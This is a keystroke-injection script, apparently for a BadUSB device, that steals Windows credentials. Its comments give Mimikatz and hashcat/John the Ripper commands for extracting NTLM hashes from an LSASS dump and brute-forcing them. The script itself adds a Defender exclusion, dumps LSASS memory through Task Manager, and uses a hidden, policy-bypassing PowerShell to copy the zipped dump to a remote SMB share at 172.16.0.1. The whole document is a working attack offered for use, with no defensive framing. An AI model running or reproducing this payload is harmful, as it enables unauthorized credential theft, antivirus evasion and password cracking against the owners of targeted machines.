// @_Extract_lsaasDMP_toSMB_V2_Infinition
// MIMIKATZ:
//
//sekurlsa::minidump \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\lsass.DMP
//sekurlsa::logonPasswords
//
//Copier le Hash NTLM
//
//
// Brute-Force with GeForce GTX 
// HASHCAT:
// cd \\172.16.0.1\Data\hashcat-6.1.1
// 
//  .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt -m 1000 -a3 ?l?l?l?l?d?d
// .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt -w4 -O -m 1000 -a3 ?u?l?l?l?l?l?l?l?d?d
// .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt -w4 -O -m 1000 -a3 ?u?l?l?l?l?l?l?l?d?d?d?d
//
// OTHER=
// ?a?a?a?a?a?a?a?a?a?a?a?a?a?a --increment-min 14 --increment-max 16.
//
// -> For usual symbols: (!_-,.:;/).
// hashcat -1 '?l?d!_-,.:;/' ?1?1?1?1?1?1?1?1?1?1?1?1?1?1
// 
// Brute-Force with Raspberry Pi  (John the Ripper)
// .\john.exe -mask=?l?l?l?l?l?l?d?d --format=NT \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt
layout('fr')
typingSpeed(0,0)
press("GUI r")
delay(200)
type("powershell")
press("CTRL SHIFT ENTER")
delay(1000)
press("SHIFT TAB")
press("ENTER")
delay(3000)
type('Add-MpPreference -ExclusionPath “\\\\172.16.0.1\\Data”\n')
delay(200)
press("ALT F4")
delay(2500)
press("GUI r")
delay(1000)
type ('taskmgr')
delay(500)
press("CTRL SHIFT ENTER")
delay(2500)
press ("ALT y")
delay(2500)
press ("DOWN")
delay(200)
type('local')
delay(200)
press ("SHIFT F10")
delay(1200)
press ("DOWN")
press ("DOWN")
press ("DOWN")
press ("DOWN")
press ("DOWN")
press ("ENTER")
delay(3500)
press ("ENTER")
press ("ALT F4")
delay(700)
press("GUI r")
delay(700)
type('powershell -ep bypass /w 1 /C $t=$env:temp;$l=\'lsass.DMP\';compress-archive -path $t\\$l -destinationpath \\\\172.16.0.1\\Data\\dump_$Env:ComputerName.zip\n')
type('\n')
delay(200)
press ("ENTER")